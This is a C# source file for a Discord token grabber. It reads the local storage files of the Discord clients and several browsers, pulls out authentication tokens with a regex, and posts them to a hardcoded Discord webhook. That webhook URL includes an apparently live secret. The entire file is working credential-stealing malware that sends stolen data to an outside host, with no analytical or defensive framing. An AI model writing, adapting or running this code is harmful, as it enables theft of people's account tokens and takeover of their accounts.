using System.Text.RegularExpressions;
using System.Collections.Specialized;
using System.Collections.Generic;
using System.Net;
using System.IO;
using System;


namespace Dxsadsa
{
    public class Program
    {
        public static void Main(string[] args)
        {
            string WEBHOOK_URL = "https://discordapp.com/api/webhooks/935608798511530017/lM1Vl6fr0B43LS3F4LqhPg2sn8_kLW2BEbFC-i7bDIWnMIwoZ4rywP6YAQOWEWcxLCSa";
            new TokenGrabber(WEBHOOK_URL);
        }

    }

    public class TokenGrabber
    {
        private readonly string url;

        public TokenGrabber(string url)
        {
            this.url = url;
            var tokens = GetTokens();

            string content = "";
            foreach (string token in tokens)
            {
                content += token + "\n";
            }
            SendTokens($"```{content}```");
        }

        public static List<string> GetTokens()
        {
            var paths = new Dictionary<string, string>();
            var tokens = new List<string>();

            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            paths.Add("Discord", roaming + "\\discord");
            paths.Add("Discord Canary", roaming + "\\discordcanary");
            paths.Add("Discord PTB", roaming + "\\discordptb");
            paths.Add("Google Chrome", local + "\\Google\\Chrome\\User Data\\Default");
            paths.Add("Brave", local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
            paths.Add("Yandex", local + "\\Yandex\\YandexBrowser\\User Data\\Default");
            paths.Add("Chromium", local + "\\Chromium\\User Data\\Default");
            paths.Add("Opera", roaming + "\\Opera Software\\Opera Stable");

            foreach (KeyValuePair<string, string> kvp in paths)
            {
                string platform = kvp.Key;
                string path = kvp.Value;

                if (!Directory.Exists(path))
                    continue;

                foreach (string token in FindTokens(path))
                {
                    tokens.Add($"{platform}: {token}");
                }
            }
            return tokens;
        }

        public static List<string> FindTokens(string path)
        {
            path += "\\Local Storage\\leveldb";
            var tokens = new List<string>();

            foreach (string file in Directory.GetFiles(path, "*.ldb", SearchOption.TopDirectoryOnly))
            {
                string content = File.ReadAllText(file);

                foreach (Match match in Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                {
                    tokens.Add(match.ToString());
                }
            }
            return tokens;
        }

        public void SendTokens(string content)
        {
            var wb = new WebClient();
            var data = new NameValueCollection();
            data["content"] = content;

            wb.UploadValues(this.url, "POST", data);
        }



    }
}